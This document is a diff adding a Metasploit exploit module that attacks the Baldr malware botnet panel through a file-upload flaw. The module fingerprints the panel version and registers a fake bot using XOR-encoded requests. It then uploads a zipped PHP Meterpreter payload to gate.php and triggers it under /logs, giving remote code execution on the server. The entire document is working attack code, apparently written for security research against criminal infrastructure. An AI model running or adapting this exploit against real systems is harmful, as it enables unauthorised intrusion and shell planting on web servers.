@@ -1,0 +1,242 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+require 'net/http'
+
+class MetasploitModule < Msf::Exploit::Remote
+  Rank = ExcellentRanking
+  include Msf::Exploit::Remote::HttpClient
+
+  def initialize(info={})
+    super(update_info(info,
+      'Name'           => "Baldr Botnet Panel Shell Upload Exploit",
+      'Description'    => %q{
+        This module exploits the file upload vulnerability of baldr malware panel.
+      },
+      'License'        => MSF_LICENSE,
+      'Author'         =>
+        [
+          'Ege Balcı <ege.balci@invictuseurope.com>' # author & msf module
+        ],
+      'References'     =>
+        [
+          ['URL', 'https://prodaft.com']
+        ],
+      'DefaultOptions'  =>
+        {
+          'SSL' => false,
+          'WfsDelay' => 5,
+        },
+      'Platform'       => ['php'],
+      'Arch'           => [ ARCH_PHP],
+      'Targets'        =>
+        [
+          ['Auto',
+            {
+              'Platform' => 'PHP',
+              'Arch' => ARCH_PHP,
+              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
+            }
+          ],
+          ['Baldr <= v2.0',
+            {
+              'Platform' => 'PHP',
+              'Arch' => ARCH_PHP,
+              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
+            }
+          ],
+          ['Baldr v2.2',
+            {
+              'Platform' => 'PHP',
+              'Arch' => ARCH_PHP,
+              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
+            }
+          ],
+          ['Baldr v3.0 & v3.1',
+            {
+              'Platform' => 'PHP',
+              'Arch' => ARCH_PHP,
+              'DefaultOptions' => {'PAYLOAD'  => 'php/meterpreter/bind_tcp'}
+            }
+          ]
+        ],
+      'Privileged'     => false,
+      'DisclosureDate' => "Dec 19 2018",
+      'DefaultTarget'  => 0
+    ))
+
+    register_options(
+      [
+        OptString.new('TARGETURI', [true, 'The URI of the baldr gate', '/']),
+      ]
+    )
+  end
+
+  def check 
+    res = send_request_cgi(
+      'method'    => 'GET',
+      'uri'       => normalize_uri(target_uri.path,"/gate.php")
+    )
+
+    ver = ''
+
+    if res.code == 200
+      if res.body.include?('~;~')
+        targets[3] = targets[0]
+        #target = targets[3]
+        ver = '>= v3.0'
+      elsif res.body.include?(';')
+        #target = targets[2]
+        targets[2] = targets[0]
+        ver = 'v2.2'
+      elsif res.body.size < 4
+        targets[1] = targets[0]
+        #target = targets[1]
+        ver = '<= v2.0'
+      else
+        Exploit::CheckCode::Safe  
+      end
+      print_status("Baldr verison: #{ver}")
+      Exploit::CheckCode::Vulnerable
+    else
+      Exploit::CheckCode::Safe
+    end
+  end
+
+  def exploit
+
+    name = '.'+Rex::Text.rand_text_alpha(4)
+    files =
+    [
+      {data: payload.encoded, fname: "#{name}.php"}
+    ]
+    zip = Msf::Util::EXE.to_zip(files) 
+    hwid = Rex::Text.rand_text_alpha(8).upcase
+
+    if targets[0]
+      check
+    end
+
+
+    case target
+    when targets[3]
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path,"/gate.php")}
+      )
+      key = res.body.to_s.split('~;~')[0]
+      print_good("Key: #{key}")
+
+      data = "hwid=#{hwid}&os=Windows 10 x64&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v3.0"
+      data = xor(data,key)
+
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path,"/gate.php"),
+        'data'  => data.to_s
+        }
+      )
+
+      if res.code == 200
+        print_good("Bot successfully registered.")
+      else
+        print_error("New bot register failed !")
+        return false
+      end
+
+      data = xor(zip.to_s,key)
+      form = Rex::MIME::Message.new
+      form.add_part(data.to_s, 'application/octet-stream', 'binary', "form-data; name=\"file\"; filename=\"file.zip\"")
+
+      res = send_request_cgi(
+        'method'    => 'POST',
+        'uri'       => normalize_uri(target_uri.path,"/gate.php"),
+        'ctype'     => "multipart/form-data; boundary=#{form.bound}",
+        'data'      => form.to_s
+      )
+      if res && (res.code == 200 ||res.code == 100)
+        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
+      else
+        print_error("Server responded with code #{res.code}") if res
+        print_error("Failed to upload payload.")
+        return false
+      end
+
+    when targets[2]
+      res = send_request_cgi({
+        'method' => 'GET',
+        'uri' => normalize_uri(target_uri.path,"/gate.php")}
+      )
+      key = res.body.to_s.split(';')[0]
+      print_good("Key: #{key}")
+      data = "hwid=#{hwid}&os=Windows 7 x64&cookie=0&paswd=0&credit=0&wallet=0&file=1&autofill=0&version=v2.2***"
+      data << zip.to_s
+      
+      result = ""
+      codepoints = data.each_codepoint.to_a
+      codepoints.each_index do |i|
+          result += (codepoints[i] ^ key[i % key.size].ord).chr
+      end
+
+      res = send_request_cgi(
+        'method'    => 'POST',
+        'uri'       => normalize_uri(target_uri.path,"/gate.php"),
+        'data'      => result.to_s
+      )
+      if res && (res.code == 200 ||res.code == 100)
+        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
+      else
+        print_error("Server responded with code #{res.code}") if res
+        print_error("Failed to upload payload.")
+        return false
+      end
+    else
+      res = send_request_cgi(
+        'method'    => 'POST',
+        'uri'       => normalize_uri(target_uri.path,"/gate.php"),
+        'data'      => zip.to_s,
+        'encode_params' => true,
+        'vars_get'  => {
+          'hwid'  => hwid,
+          'os'  => 'Windows 7 x64',
+          'cookie'  => '0',
+          'pswd'  => '0',
+          'credit'  => '0',
+          'wallet'  => '0',
+          'file'  => '1',
+          'autofill'  => '0',
+          'version'  => 'v2.0'
+        }
+      )
+
+      if res && (res.code == 200 ||res.code == 100)
+        print_good("Payload uploaded to /logs/#{hwid}/#{name}.php")
+      else
+        print_error("Server responded with code #{res.code}") if res
+        print_error("Failed to upload payload.")
+        return false
+      end
+    end
+
+
+    send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path,"/logs/#{hwid}/#{name}.php")}, 3
+    )
+    
+    print_good("Payload successfully triggered !")
+  end
+
+  def xor(data, key)
+    result = ""
+    codepoints = data.each_codepoint.to_a
+    codepoints.each_index do |i|
+        result += (codepoints[i] ^ key[i % key.size].ord).chr
+    end
+    return result
+  end
+
+
+end
